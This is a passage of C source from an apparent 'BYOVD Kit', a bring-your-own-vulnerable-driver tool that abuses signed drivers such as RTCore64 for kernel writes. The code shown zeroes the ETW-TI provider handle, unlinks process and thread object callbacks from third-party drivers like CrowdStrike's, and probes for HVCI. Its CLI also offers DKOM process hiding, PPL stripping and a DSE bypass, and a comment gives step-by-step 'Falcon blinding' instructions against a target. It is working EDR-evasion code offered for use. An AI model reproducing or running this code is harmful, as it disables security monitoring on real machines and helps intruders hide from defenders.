 * This must run BEFORE any injection attempt to be effective.
 */
static BOOL bvd_disable_etwti(ULONGLONG kbase) {
    ULONGLONG fn_ka=bvd_find_kexport(kbase,"EtwTiLogAllocExecVm");
    if(!fn_ka) return FALSE;

    BYTE buf[128]={0};
    for(int i=0;i<128;i+=8){
        ULONGLONG v=bvd_read8(fn_ka+(ULONGLONG)i);
        for(int b=0;b<8&&i+b<128;b++) buf[i+b]=(BYTE)(v>>(b*8));
    }
    /* 48 83 3D xx xx xx xx 00 : CMP QWORD PTR [RIP+disp32], 0 */
    for(int i=0;i<120;i++){
        if(buf[i]==0x48&&buf[i+1]==0x83&&buf[i+2]==0x3D&&buf[i+7]==0x00){
            INT32 disp=*(INT32*)(buf+i+3);
            /* Handle address is relative to the instruction after this 8-byte insn */
            ULONGLONG handle_addr=fn_ka+(ULONGLONG)(i+8)+(LONGLONG)disp;
            bvd_write8(handle_addr,0ULL);
            return TRUE;
        }
    }
    return FALSE;
}

/*
 * Task 7 — ObRegisterCallbacks removal.
 *
 * CrowdStrike registers object callbacks via ObRegisterCallbacks on
 * PsProcessType and PsThreadType to strip PROCESS_VM_READ/WRITE/OPERATION
 * rights from handles obtained via NtOpenProcess.  This silently degrades
 * all injection attempts even after Psp* notify callbacks are removed.
 *
 * Structure chain (Win10 20H2 – Win11 23H2 x64):
 *   PsProcessType → _OBJECT_TYPE* → +0xC8 CallbackList (LIST_ENTRY head)
 *   Each _OB_CALLBACK_ENTRY:
 *     +0x00 LIST_ENTRY (Flink/Blink)
 *     +0x28 PreOperation  (function pointer)
 *     +0x30 PostOperation (function pointer)
 *
 * We walk each list and unlink entries whose callback functions fall outside
 * the ntoskrnl address range (i.e., are in third-party drivers like csagent).
 */
#define OB_TYPE_CBLIST_OFF  0xC8
#define OB_CB_PRE_OFF       0x28
#define OB_CB_POST_OFF      0x30

static int bvd_remove_ob_callbacks(ULONGLONG kbase) {
    const char *type_exports[]={"PsProcessType","PsThreadType",NULL};
    ULONGLONG kern_end=kbase+0x1000000ULL;
    int removed=0;

    for(int ti=0;type_exports[ti];ti++){
        ULONGLONG ptype_sym=bvd_find_kexport(kbase,type_exports[ti]);
        if(!ptype_sym) continue;
        /* PsProcessType is POBJECT_TYPE* — dereference once */
        ULONGLONG obj_type=bvd_read8(ptype_sym);
        if(!obj_type) continue;

        ULONGLONG list_head=obj_type+OB_TYPE_CBLIST_OFF;
        ULONGLONG cur=bvd_read8(list_head);  /* head.Flink */

        for(int it=0;it<64&&cur&&cur!=list_head;it++){
            ULONGLONG next =bvd_read8(cur+0);   /* Flink of this entry */
            ULONGLONG blink=bvd_read8(cur+8);   /* Blink of this entry */
            ULONGLONG pre  =bvd_read8(cur+OB_CB_PRE_OFF);
            ULONGLONG post =bvd_read8(cur+OB_CB_POST_OFF);

            int third_party=
                (pre  && (pre <kbase||pre >kern_end))||
                (post && (post<kbase||post>kern_end));

            if(third_party){
                /* Unlink: blink.Flink = next, next.Blink = blink */
                bvd_write8(blink,next);
                bvd_write8(next+8,blink);
                /* Zero the function pointers so stale references are harmless */
                bvd_write8(cur+OB_CB_PRE_OFF, 0ULL);
                bvd_write8(cur+OB_CB_POST_OFF,0ULL);
                removed++;
            }
            cur=next;
        }
    }
    return removed;
}

/*
 * Task 8 — HVCI detection.
 *
 * Hypervisor-Protected Code Integrity (HVCI/KMCI) prevents kernel writes via
 * vulnerable userland drivers on systems where it is enabled.  Attempting
 * kernel writes on an HVCI host will cause a bug-check or silent failure.
 * Detect it cleanly before loading the driver.
 *
 * Uses NtQuerySystemInformation(SystemCodeIntegrityInformation=103) which
 * returns a SYSTEM_CODEINTEGRITY_INFORMATION.  Bit 0x400 =
 * CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED.
 */
static BOOL bvd_check_hvci(void) {
    typedef struct { ULONG Length; ULONG CodeIntegrityOptions; } _BVD_CI;
    typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG,PVOID,ULONG,PULONG);
    HMODULE hNt=GetModuleHandleA("ntdll.dll"); if(!hNt) return FALSE;
    pfnNtQSI fnQ=(pfnNtQSI)GetProcAddress(hNt,"NtQuerySystemInformation");
    if(!fnQ) return FALSE;
    _BVD_CI ci; ci.Length=sizeof(ci); ci.CodeIntegrityOptions=0;
    ULONG ret=0;
    fnQ(103,&ci,sizeof(ci),&ret);
    return (ci.CodeIntegrityOptions&0x400)!=0;
}

/* CRT shim: GCC may emit implicit memset calls for large struct zero-fills */
void *memset(void *s,int c,SIZE_T n){volatile BYTE *p=(volatile BYTE*)s;while(n--)*p++=(BYTE)c;return s;}

/* ── Main entry ──────────────────────────────────────────────────────────── */
/*
 * CLI:
 *   byovd.exe --driver C:\path\RTCore64.sys [--gdrv | --winring0]
 *             [--remove-callbacks] [--remove-ob-callbacks] [--etwti]
 *             [--hide-pid <pid>] [--strip-ppl <pid>] [--dse-bypass]
 *             [--hvci-check]
 *
 * All kernel ops require the driver to be loaded first (--driver flag).
 * Run order for full Falcon blinding:
 *   1. Upload driver + byovd.exe to target.
 *   2. byovd.exe --driver <path> --hvci-check
 *   3. byovd.exe --driver <path> --etwti --remove-callbacks --remove-ob-callbacks
 *   4. Optionally --hide-pid <agent_pid> and/or --dse-bypass.
 */
static int bv_run(int argc, wchar_t **argv) {
    LPCWSTR drv_path=NULL; int drv_type=0;
    DWORD hide_pid=0, strip_ppl_pid=0;
    int rm_cb=0, rm_ob=0, etwti=0, dse=0, hvci_only=0;

    for(int i=1;i<argc;i++){
        if(!bv_wicmp(argv[i],L"--driver")&&i+1<argc){drv_path=argv[++i];continue;}
        if(!bv_wicmp(argv[i],L"--gdrv")){drv_type=1;continue;}
        if(!bv_wicmp(argv[i],L"--winring0")){drv_type=2;continue;}
        if(!bv_wicmp(argv[i],L"--remove-callbacks")){rm_cb=1;continue;}
        if(!bv_wicmp(argv[i],L"--remove-ob-callbacks")){rm_ob=1;continue;}
        if(!bv_wicmp(argv[i],L"--etwti")){etwti=1;continue;}
        if(!bv_wicmp(argv[i],L"--dse-bypass")){dse=1;continue;}
        if(!bv_wicmp(argv[i],L"--hvci-check")){hvci_only=1;continue;}
        if(!bv_wicmp(argv[i],L"--hide-pid")&&i+1<argc){
            LPCWSTR ps=argv[++i];DWORD v=0;
            while(*ps>='0'&&*ps<='9'){v=v*10+(*ps++-'0');}
            hide_pid=v; continue;
        }
        if(!bv_wicmp(argv[i],L"--strip-ppl")&&i+1<argc){
            LPCWSTR ps=argv[++i];DWORD v=0;
            while(*ps>='0'&&*ps<='9'){v=v*10+(*ps++-'0');}
            strip_ppl_pid=v; continue;
        }
    }

    /* HVCI check — no driver needed */
    if(hvci_only){
        if(bvd_check_hvci())
            BV_REPORT(L"BYOVD Kit",
                      L"[!] HVCI is ENABLED — BYOVD kernel writes will fail.\r\n"
                      L"    Skip BYOVD on this host.",1);
        else
            BV_REPORT(L"BYOVD Kit",L"[+] HVCI not detected — BYOVD should work.\r\n",0);
        return 0;
    }

    if(!drv_path){
        BV_REPORT(L"BYOVD Kit",
            L"Usage: byovd.exe --driver <path.sys> [--gdrv | --winring0]\r\n"
            L"  Falcon blinding : --etwti  --remove-callbacks  --remove-ob-callbacks\r\n"
            L"  Process hiding  : --hide-pid <pid>\r\n"
            L"  PPL strip       : --strip-ppl <pid>\r\n"
            L"  DSE bypass      : --dse-bypass\r\n"
            L"  HVCI probe      : --hvci-check  (no --driver needed)",0);
        return 1;
    }

    /* Pre-flight: warn if HVCI is active */
    if(bvd_check_hvci())
        BV_REPORT(L"BYOVD Kit",L"[!] HVCI detected — kernel writes may fail or BSOD.\r\n",1);

    if(!bvd_load_driver(drv_path,drv_type)){
        BV_REPORT(L"BYOVD Kit",
                  L"[-] Driver load failed (need SYSTEM + SeLoadDriverPrivilege)\r\n",1);
        return 2;
    }

    ULONGLONG kbase=bvd_ntoskrnl_base();
    if(!kbase){
        BV_REPORT(L"BYOVD Kit",L"[-] Cannot resolve ntoskrnl base\r\n",1);
        return 3;
    }

    WCHAR msg[1024]={0};
    static const WCHAR _ok[]={L'[',L'+',L']',L' ',0};
    static const WCHAR _nl[]={L'\r',L'\n',0};

    /* ETW-TI must come first — before callbacks fire on injection */
    if(etwti){
        if(bvd_disable_etwti(kbase)){
            bv_wcat(msg,_ok); bv_wcat(msg,L"ETW-TI provider handle zeroed (Falcon sensor blinded)");
            bv_wcat(msg,_nl);
        } else {
            bv_wcat(msg,L"[-] ETW-TI: EtwTiLogAllocExecVm pattern not found\r\n");
        }
    }

    if(rm_cb){
        int n=bvd_remove_callbacks(kbase);
        WCHAR nbuf[16]={0}; DWORD nv=(DWORD)n; int ni=0;
        if(!nv){nbuf[ni++]=L'0';} else{WCHAR tmp[12];int ti=0;while(nv){tmp[ti++]=(WCHAR)('0'+nv%10);nv/=10;}while(ti>0)nbuf[ni++]=tmp[--ti];}
        nbuf[ni]=0;
        bv_wcat(msg,_ok); bv_wcat(msg,L"Removed "); bv_wcat(msg,nbuf);
        bv_wcat(msg,L" Psp notify callbacks"); bv_wcat(msg,_nl);
    }

    if(rm_ob){
        int n=bvd_remove_ob_callbacks(kbase);
        WCHAR nbuf[16]={0}; DWORD nv=(DWORD)n; int ni=0;
        if(!nv){nbuf[ni++]=L'0';} else{WCHAR tmp[12];int ti=0;while(nv){tmp[ti++]=(WCHAR)('0'+nv%10);nv/=10;}while(ti>0)nbuf[ni++]=tmp[--ti];}
        nbuf[ni]=0;
        bv_wcat(msg,_ok); bv_wcat(msg,L"Removed "); bv_wcat(msg,nbuf);
        bv_wcat(msg,L" ObRegisterCallbacks entries"); bv_wcat(msg,_nl);
    }

    if(hide_pid){
        if(!bvd_dkom_hide(kbase,hide_pid))
            bv_wcat(msg,L"[-] DKOM failed — EPROCESS not found\r\n");
        else{ bv_wcat(msg,_ok); bv_wcat(msg,L"Process hidden via DKOM\r\n"); }
    }

    if(strip_ppl_pid){
        if(!bvd_ppl_strip(kbase,strip_ppl_pid))
            bv_wcat(msg,L"[-] PPL strip failed — EPROCESS not found\r\n");
        else{ bv_wcat(msg,_ok); bv_wcat(msg,L"PPL protection byte zeroed\r\n"); }
    }

    if(dse){
        if(!bvd_dse_bypass(kbase,NULL,NULL))
            bv_wcat(msg,L"[-] DSE bypass: g_CiEnabled not found\r\n");
        else{ bv_wcat(msg,_ok); bv_wcat(msg,L"DSE bypass window executed\r\n"); }
    }

    if(!msg[0]) bv_wcat(msg,L"[+] Driver loaded — no action flags specified.\r\n");
    BV_REPORT(L"BYOVD Kit",msg,0);

    if(g_hDrv!=INVALID_HANDLE_VALUE) CloseHandle(g_hDrv);
    return 0;
}

int __stdcall BVDEntry(void) {
    int argc=0; LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
    int ret=bv_run(argc,argv);
    LocalFree(argv);
    ExitProcess((UINT)ret);
}
